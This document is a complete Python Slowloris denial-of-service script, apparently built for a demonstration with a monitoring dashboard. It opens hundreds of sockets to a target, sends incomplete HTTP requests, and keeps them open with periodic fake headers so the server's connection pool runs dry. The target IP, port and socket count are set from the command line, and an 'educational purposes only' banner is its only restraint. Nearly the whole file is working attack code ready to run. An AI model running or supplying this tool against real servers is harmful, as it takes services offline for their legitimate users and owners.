#!/usr/bin/env python3
"""
Enhanced Slowloris Attack Script with Monitoring
===============================================

This enhanced version of the Slowloris attack provides detailed metrics
and monitoring capabilities for the live dashboard demonstration.

Features:
- Real-time connection monitoring
- Detailed attack statistics
- Progress tracking
- Better error handling
- Metrics export for dashboard
"""

import socket
import time
import threading
import random
import json
import sys
import signal
from datetime import datetime
from collections import defaultdict

class SlowlorisAttackMonitor:
    def __init__(self, target_ip="localhost", target_port=8080, socket_count=400):
        self.target_ip = target_ip
        self.target_port = target_port
        self.socket_count = socket_count
        
        # Attack state
        self.sockets = []
        self.active = False
        self.start_time = None
        
        # Statistics
        self.stats = {
            'connections_created': 0,
            'connections_failed': 0,
            'connections_lost': 0,
            'headers_sent': 0,
            'errors': [],
            'performance_metrics': []
        }
        
        # User agents for randomization
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101',
            'Slowloris/2.0 (Educational Demo)',
            'Chrome/91.0.4472.124 Safari/537.36',
            'Firefox/89.0',
            'Safari/14.1.1'
        ]
        
        # Setup signal handlers for graceful shutdown
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)
    
    def signal_handler(self, signum, frame):
        """Handle shutdown signals gracefully"""
        print(f"\n[!] Received signal {signum}, shutting down gracefully...")
        self.stop_attack()
        sys.exit(0)
    
    def log_event(self, message, level="INFO"):
        """Log events with timestamp"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(f"[{timestamp}] [{level}] {message}")
        
        if level == "ERROR":
            self.stats['errors'].append({
                'timestamp': timestamp,
                'message': message
            })
    
    def create_socket_connection(self):
        """Create a single socket connection to the target"""
        try:
            # Create socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            
            # Connect to target
            sock.connect((self.target_ip, self.target_port))
            
            # Send partial HTTP request
            request_line = f"GET /?{random.randint(0, 10000)} HTTP/1.1\r\n"
            sock.send(request_line.encode('utf-8'))
            
            # Send Host header
            host_header = f"Host: {self.target_ip}\r\n"
            sock.send(host_header.encode('utf-8'))
            
            # Send User-Agent header
            user_agent = random.choice(self.user_agents)
            ua_header = f"User-Agent: {user_agent}\r\n"
            sock.send(ua_header.encode('utf-8'))
            
            # Send Accept-Language header
            accept_lang = "Accept-language: en-US,en,q=0.5\r\n"
            sock.send(accept_lang.encode('utf-8'))
            
            self.stats['connections_created'] += 1
            return sock
            
        except socket.error as e:
            self.stats['connections_failed'] += 1
            self.log_event(f"Failed to create connection: {e}", "ERROR")
            return None
        except Exception as e:
            self.stats['connections_failed'] += 1
            self.log_event(f"Unexpected error creating connection: {e}", "ERROR")
            return None
    
    def send_keep_alive(self, sock):
        """Send keep-alive header to maintain connection"""
        try:
            # Send random header to keep connection alive
            header_name = random.choice(['X-a', 'X-b', 'X-c', 'X-d', 'X-e'])
            header_value = random.randint(1, 10000)
            header = f"{header_name}: {header_value}\r\n"
            
            sock.send(header.encode('utf-8'))
            self.stats['headers_sent'] += 1
            return True
            
        except socket.error:
            self.stats['connections_lost'] += 1
            return False
        except Exception as e:
            self.log_event(f"Error sending keep-alive: {e}", "ERROR")
            self.stats['connections_lost'] += 1
            return False
    
    def create_initial_connections(self):
        """Create initial pool of connections"""
        self.log_event(f"Creating initial {self.socket_count} connections...")
        
        for i in range(self.socket_count):
            if not self.active:
                break
                
            sock = self.create_socket_connection()
            if sock:
                self.sockets.append(sock)
            
            # Progress reporting
            if i % 50 == 0 and i > 0:
                active_connections = len(self.sockets)
                success_rate = (active_connections / (i + 1)) * 100
                self.log_event(f"Progress: {i+1}/{self.socket_count} - "
                             f"Active: {active_connections} - "
                             f"Success: {success_rate:.1f}%")
            
            # Small delay to avoid overwhelming the target
            time.sleep(0.01)
        
        final_count = len(self.sockets)
        success_rate = (final_count / self.socket_count) * 100
        self.log_event(f"Initial connections complete: {final_count}/{self.socket_count} "
                      f"({success_rate:.1f}% success rate)")
    
    def maintain_connections(self):
        """Main loop to maintain connections"""
        self.log_event("Starting connection maintenance loop...")
        
        cycle_count = 0
        while self.active:
            cycle_start = time.time()
            cycle_count += 1
            
            # Send keep-alive to existing connections
            active_sockets = []
            for sock in self.sockets:
                if self.send_keep_alive(sock):
                    active_sockets.append(sock)
                else:
                    try:
                        sock.close()
                    except:
                        pass
            
            self.sockets = active_sockets
            
            # Create new connections to replace lost ones
            target_count = self.socket_count
            current_count = len(self.sockets)
            needed = target_count - current_count
            
            if needed > 0:
                self.log_event(f"Replacing {needed} lost connections...")
                for _ in range(min(needed, 50)):  # Limit to 50 per cycle
                    if not self.active:
                        break
                    sock = self.create_socket_connection()
                    if sock:
                        self.sockets.append(sock)
            
            # Calculate and log statistics
            current_count = len(self.sockets)
            cycle_time = time.time() - cycle_start
            
            if cycle_count % 5 == 0:  # Log every 5 cycles
                uptime = time.time() - self.start_time
                self.log_event(f"Cycle {cycle_count}: {current_count} active connections, "
                              f"uptime: {uptime:.0f}s, cycle time: {cycle_time:.2f}s")
                
                # Store performance metrics
                self.stats['performance_metrics'].append({
                    'timestamp': datetime.now().isoformat(),
                    'active_connections': current_count,
                    'uptime': uptime,
                    'cycle_time': cycle_time,
                    'connections_created': self.stats['connections_created'],
                    'connections_failed': self.stats['connections_failed'],
                    'connections_lost': self.stats['connections_lost'],
                    'headers_sent': self.stats['headers_sent']
                })
            
            # Sleep between cycles
            time.sleep(10)
    
    def start_attack(self):
        """Start the Slowloris attack"""
        if self.active:
            self.log_event("Attack is already running!", "WARNING")
            return False
        
        self.active = True
        self.start_time = time.time()
        
        self.log_event("="*60)
        self.log_event("SLOWLORIS ATTACK INITIATED")
        self.log_event("="*60)
        self.log_event(f"Target: {self.target_ip}:{self.target_port}")
        self.log_event(f"Socket Count: {self.socket_count}")
        self.log_event(f"Start Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        self.log_event("="*60)
        
        try:
            # Create initial connections
            self.create_initial_connections()
            
            if not self.sockets:
                self.log_event("Failed to create any connections. Attack aborted.", "ERROR")
                self.active = False
                return False
            
            self.log_event(f"Attack established with {len(self.sockets)} connections")
            self.log_event("Entering maintenance phase...")
            
            # Start maintenance loop
            self.maintain_connections()
            
        except KeyboardInterrupt:
            self.log_event("Attack interrupted by user", "WARNING")
        except Exception as e:
            self.log_event(f"Attack failed with error: {e}", "ERROR")
        finally:
            self.stop_attack()
        
        return True
    
    def stop_attack(self):
        """Stop the attack and cleanup"""
        if not self.active:
            return
        
        self.log_event("Stopping attack and cleaning up...")
        self.active = False
        
        # Close all sockets
        closed_count = 0
        for sock in self.sockets:
            try:
                sock.close()
                closed_count += 1
            except:
                pass
        
        self.sockets.clear()
        
        # Calculate final statistics
        if self.start_time:
            total_time = time.time() - self.start_time
            self.log_event("="*60)
            self.log_event("ATTACK SUMMARY")
            self.log_event("="*60)
            self.log_event(f"Total Duration: {total_time:.2f} seconds")
            self.log_event(f"Connections Created: {self.stats['connections_created']}")
            self.log_event(f"Connections Failed: {self.stats['connections_failed']}")
            self.log_event(f"Connections Lost: {self.stats['connections_lost']}")
            self.log_event(f"Headers Sent: {self.stats['headers_sent']}")
            self.log_event(f"Sockets Closed: {closed_count}")
            self.log_event(f"Error Count: {len(self.stats['errors'])}")
            
            if self.stats['connections_created'] > 0:
                success_rate = ((self.stats['connections_created'] - self.stats['connections_failed']) / 
                              self.stats['connections_created']) * 100
                self.log_event(f"Overall Success Rate: {success_rate:.2f}%")
            
            self.log_event("="*60)
    
    def get_stats(self):
        """Get current attack statistics"""
        current_stats = self.stats.copy()
        current_stats.update({
            'active': self.active,
            'active_connections': len(self.sockets),
            'uptime': time.time() - self.start_time if self.start_time else 0,
            'target': f"{self.target_ip}:{self.target_port}"
        })
        return current_stats

def main():
    """Main function"""
    # Parse command line arguments
    target_ip = sys.argv[1] if len(sys.argv) > 1 else "localhost"
    target_port = int(sys.argv[2]) if len(sys.argv) > 2 else 8080
    socket_count = int(sys.argv[3]) if len(sys.argv) > 3 else 400
    
    # Create and start attack
    attack = SlowlorisAttackMonitor(target_ip, target_port, socket_count)
    
    print(f"""
╔══════════════════════════════════════════════════════════════╗
║                    SLOWLORIS ATTACK TOOL                    ║
║                   Educational Demo Version                  ║
╠══════════════════════════════════════════════════════════════╣
║  Target: {target_ip}:{target_port:<48} ║
║  Sockets: {socket_count:<52} ║
║                                                              ║
║  ⚠️  WARNING: For educational purposes only!                ║
║      Use only on systems you own or have permission to test ║
╚══════════════════════════════════════════════════════════════╝
    """)
    
    # Confirm before starting
    try:
        input("Press Enter to start the attack (Ctrl+C to cancel)...")
    except KeyboardInterrupt:
        print("\nAttack cancelled by user.")
        sys.exit(0)
    
    # Start the attack
    attack.start_attack()

if __name__ == "__main__":
    main() 